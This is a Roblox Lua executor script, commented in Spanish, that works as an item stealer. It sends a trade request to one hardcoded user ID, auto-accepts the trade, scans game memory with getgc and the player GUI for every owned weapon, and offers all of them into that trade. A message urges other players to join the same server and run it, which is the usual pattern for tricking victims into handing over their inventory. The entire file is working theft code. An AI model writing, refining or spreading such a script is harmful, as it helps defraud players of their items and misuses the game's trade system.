-- Paso 1: Enviar el trade a Aaron (AARON287240)
local targetUserId = 10631566712
local targetPlayer = nil

for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
    if player.UserId == targetUserId then
        targetPlayer = player
        break
    end
end

if targetPlayer then
    local argsSend = {
        [1] = targetPlayer
    }
    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(argsSend))
    print("¡Solicitud de trade enviada a Aaron!")
else
    warn("Aaron no está en este servidor. ¡Entren al mismo juego!")
    return
end

-- Esperar a que se abra la sesión de trade
task.wait(1.5)

-- Paso 2: Aceptar el trade automáticamente
local acceptArgs = {
    [1] = 428469873,
    [2] = 21997.844980315014
}
pcall(function()
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acceptArgs))
end)

task.wait(0.5)

-- Paso 3: Extraer TODAS las armas usando métodos avanzados de búsqueda en el juego
local weaponsList = {}
local seen = {}

-- Método A: Escanear la memoria activa del juego (getgc) para encontrar las armas poseídas
pcall(function()
    for _, obj in ipairs(getgc(true)) do
        if type(obj) == "table" then
            local weapons = rawget(obj, "Weapons")
            if type(weapons) == "table" then
                local owned = rawget(weapons, "Owned")
                if type(owned) == "table" then
                    for k, val in pairs(owned) do
                        local weaponId = tonumber(k) and val or k
                        if type(weaponId) == "string" and not seen[weaponId] then
                            seen[weaponId] = true
                            table.insert(weaponsList, weaponId)
                        end
                    end
                end
            end
        end
    end
end)

-- Método B: Escanear la interfaz gráfica (PlayerGui) por si tienes el inventario abierto o cargado
pcall(function()
    local playerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
    if playerGui then
        for _, desc in ipairs(playerGui:GetDescendants()) do
            if desc:IsA("GuiObject") then
                local itemId = desc:GetAttribute("ItemID")
                if itemId and type(itemId) == "string" and not seen[itemId] then
                    seen[itemId] = true
                    table.insert(weaponsList, itemId)
                end
            end
        end
    end
end)

print("¡Se detectaron " .. #weaponsList + 0 .. " armas en total para ofrecer a Aaron!")

-- Paso 4: Ofrecer cada arma detectada al trade
for _, weaponName in ipairs(weaponsList) do
    local offerArgs = {
        [1] = weaponName,
        [2] = "Weapons"
    }
    
    local successOffer, err = pcall(function()
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(offerArgs))
    end)
    
    if successOffer then
        print("✔ Arma ofrecida: " .. weaponName)
    else
        warn("✖ No se pudo ofrecer " .. weaponName .. ": " .. tostring(err))
    end
    
    -- Pausa corta para que el servidor procese cada arma sin dar error de spam
    task.wait(0.15)
end

print("¡Proceso finalizado! Todas las armas disponibles fueron enviadas al trade de Aaron.")
